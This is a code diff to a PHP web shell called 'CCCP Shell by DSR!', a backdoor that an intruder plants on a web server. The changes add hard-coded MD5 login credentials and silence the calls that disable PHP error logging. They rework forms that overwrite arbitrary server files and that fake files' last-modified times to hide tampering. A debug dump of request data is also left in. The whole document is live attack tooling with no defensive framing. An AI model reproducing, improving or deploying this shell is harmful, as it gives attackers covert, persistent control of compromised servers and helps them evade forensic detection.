@@ -1,7 +1,7 @@
 <?php
 /*
  * CCCP Shell by DSR!
- * Version: 1.0 Build: 04062012
+ * Version: 1.0 Build: 05062012
  */
 
 $tiempoCarga = microtime(true);
@@ -20,15 +20,15 @@ ini_restore('open_basedir');
 
 # Extras 
 if (function_exists('ini_set')) {
-    ini_set('error_log', null); // No alarming logs
-    ini_set('log_errors', 0);   // No logging of errors
-    ini_set('file_uploads', 1); // Enable file uploads
-    ini_set('allow_url_fopen', 1); // allow url fopen
+    @ini_set('error_log', null); // No alarming logs
+    @ini_set('log_errors', 0);   // No logging of errors
+    @ini_set('file_uploads', 1); // Enable file uploads
+    @ini_set('allow_url_fopen', 1); // allow url fopen
 } else { //Alias of ini_set()
-    ini_alter('error_log', null);
-    ini_alter('log_errors', 0);
-    ini_alter('file_uploads', 1);
-    ini_alter('allow_url_fopen', 1);
+    @ini_alter('error_log', null);
+    @ini_alter('log_errors', 0);
+    @ini_alter('file_uploads', 1);
+    @ini_alter('allow_url_fopen', 1);
 }
 
 error_reporting(7);
@@ -42,8 +42,8 @@ $Config['Menu'] = 'menu';
 $Config['Action'] = 'act';
 $Config['Mode'] = 'mode';
 $Config['zAuthType'] = 'basic'; //type of validation
-$Config['zName'] = ''; //md5('User');
-$Config['zPass'] = ''; //md5('Pass');
+$Config['zName'] = 'b4135e9bd2eb76ee18cff0b846db3b5c'; //echo md5('user') . '<br>';
+$Config['zPass'] = '71a7c3b036591cf4737390f8f82fa518'; //echo md5('pass');
 $Config['hexdump_lines'] = 16; //lines in hex preview file
 $Config['hexdump_rows'] = 32; //16, 24 or 32 bytes in one line
 if (@! $_POST[$Config['Menu']]) $_POST[$Config['Menu']] = 'file'; //default action
@@ -1163,6 +1163,7 @@ if ($_POST[$Config['Menu']] === 'file') {
 		@fclose($fp);
 	} elseif (@$_POST[$Config['Mode']] === 'edit') {
 		if(file_exists($_POST['target'])) {
+			$tmp = pathinfo($_POST['target']);
 			$fp = @fopen($_POST['target'], 'r');
 			$contents = @fread($fp, filesize($_POST['target']));
 			@fclose($fp);
@@ -1176,36 +1177,46 @@ if ($_POST[$Config['Menu']] === 'file') {
 			$Content .= '
 					<h2>File Edit</h2><br><br>
 					<form name="form" action="' . $self . '" method="post" >
-					<input type="hidden" name="' . $Config['Action'] . '" value="moddatefile" />
-					<h3>Clone folder/file was last modified time &raquo;</h3>
-					<p>Alter folder/file<br /><input class="input" name="curfile" id="curfile" value="' . $_POST['target'] . '" type="text" size="120"  /></p>
-					<p>Reference folder/file (fullpath)<br /><input class="input" name="tarfile" id="tarfile" value="" type="text" size="120"  /></p>
-					<p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
+						<input type="hidden" name="' . $Config['Menu'] . '" value="file" />
+						<input type="hidden" name="' . $Config['Action'] . '" value="moddatefile" />
+						<input type="hidden" name="dir" value="' . $tmp['dirname'] . '/" />
+						<h3>Clone folder/file was last modified time &raquo;</h3>
+						<p>Alter folder/file<br /><input class="input" name="curfile" id="curfile" value="' . $_POST['target'] . '" type="text" size="120"  /></p>
+						<p>Reference folder/file (fullpath)<br /><input class="input" name="tarfile" id="tarfile" value="" type="text" size="120"  /></p>
+						<p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
 					</form>
+					
 					<form name="form" action="' . $self . '" method="post" >
-					<input type="hidden" name="' . $Config['Action'] . '" value="moddate" />
-					<h3>Set last modified &raquo;</h3>
-					<p>
-						Current folder/file (fullpath)<br />
-						<input class="input" name="curfile" id="curfile" value="' . $_POST['target'] . '" type="text" size="120" />
-					</p>
-					<p>
-						year: <input class="input" name="year" id="year" value="' . $filemtime[0] . '" type="text" size="4" />
-						month: <input class="input" name="month" id="month" value="' . $filemtime[1] . '" type="text" size="2" />
-						day: <input class="input" name="day" id="day" value="' . $filemtime[2] . '" type="text" size="2" />
-						hour: <input class="input" name="hour" id="hour" value="' . $filemtime[3] . '" type="text" size="2" />
-						minute: <input class="input" name="minute" id="minute" value="' . $filemtime[4] . '" type="text" size="2" />
-						second: <input class="input" name="second" id="second" value="' . $filemtime[5] . '" type="text" size="2" />
-					</p>
-					<p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
+						<input type="hidden" name="' . $Config['Menu'] . '" value="file" />
+						<input type="hidden" name="' . $Config['Action'] . '" value="moddate" />
+						<input type="hidden" name="dir" value="' . $tmp['dirname'] . '/" />
+						<h3>Set last modified &raquo;</h3>
+						<p>
+							Current folder/file (fullpath)<br />
+							<input class="input" name="curfile" id="curfile" value="' . $_POST['target'] . '" type="text" size="120" />
+						</p>
+						<p>
+							year: <input class="input" name="year" id="year" value="' . $filemtime[0] . '" type="text" size="4" />
+							month: <input class="input" name="month" id="month" value="' . $filemtime[1] . '" type="text" size="2" />
+							day: <input class="input" name="day" id="day" value="' . $filemtime[2] . '" type="text" size="2" />
+							hour: <input class="input" name="hour" id="hour" value="' . $filemtime[3] . '" type="text" size="2" />
+							minute: <input class="input" name="minute" id="minute" value="' . $filemtime[4] . '" type="text" size="2" />
+							second: <input class="input" name="second" id="second" value="' . $filemtime[5] . '" type="text" size="2" />
+						</p>
+						<p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
 					</form>
 
-					 <p>File Name:<br><input class="input" name="dir" value="' . $_POST['target'] . '" type="text" size="100%"></p><br>
-					 <p>File Content:<br><textarea class="area" id="filecontent" name="filecontent" cols="100" rows="25" >' . htmlspecialchars($contents) . '</textarea>
-					 <input type="hidden" name="target" value="' . $_POST['target'] . '" />
-					 <br><br><center><input class="bt" name="submit" id="submit" type="submit" value="Submit"></center><br><br>';
+					<form name="form" action="' . $self . '" method="post" >
+						<input type="hidden" name="' . $Config['Menu'] . '" value="file" />
+						<input type="hidden" name="' . $Config['Action'] . '" value="edit" />
+						<input type="hidden" name="dir" value="' . $tmp['dirname'] . '/" />
+						<p>File Name:<br><input class="input" name="editfilename" value="' . $_POST['target'] . '" type="text" size="100%"></p><br>
+						<p>File Content:<br><center><textarea class="area" id="filecontent" name="filecontent" cols="100" rows="25" style="width: 99%;">' . htmlspecialchars($contents) . '</textarea></center>
+						<br><br><center><input class="bt" name="submit" id="submit" type="submit" value="Submit"></center><br><br>
+					</form>';
 		}
-	} else {		
+	} else {
+		var_dump($_POST);
         # Acciones
         // Obtenemos el directorio en el que estamos
         $current_dir = @$_POST['dir'];
@@ -1247,8 +1258,8 @@ if ($_POST[$Config['Menu']] === 'file') {
                     break;
 
                 case 'edit': // Editar archivo
-                    $fp = @fopen($editfilename, 'w');
-                    $Content .= simpleDialog('Archivo guardado ' . (@fwrite($fp, $filecontent) ? 'correctamente' : 'fallo'));
+                    $fp = @fopen($_POST['editfilename'], 'w');
+                    $Content .= simpleDialog('Archivo guardado ' . (@fwrite($fp, $_POST['filecontent']) ? 'correctamente' : 'fallo'));
                     @fclose($fp);
                     break;
 
